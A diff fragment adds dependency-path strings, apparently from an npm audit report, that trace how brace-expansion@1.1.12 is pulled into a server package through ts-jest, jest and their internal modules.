+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/reporters@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-resolve-dependencies@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > @jest/core@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > babel-jest@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-runtime@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-circus@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > minimatch@3.1.5 > brace-expansion@1.1.12",
+            "server > ts-jest@29.4.9 > jest@29.7.0 > jest-cli@29.7.0 > create-jest@29.7.0 > jest-config@29.7.0 > jest-runner@29.7.0 > jest-runtime@29.7.0 > @jest/globals@29.7.0 > @jest/expect@29.7.0 > jest-snapshot@29.7.0 > @jest/transform@29.7.0 > babel-plugin-istanbul@6.1.1 > test-exclude@6.0.0 > glob@7.2.3 > minimatch@3.1.5 > brace-expansion@1.1.12",
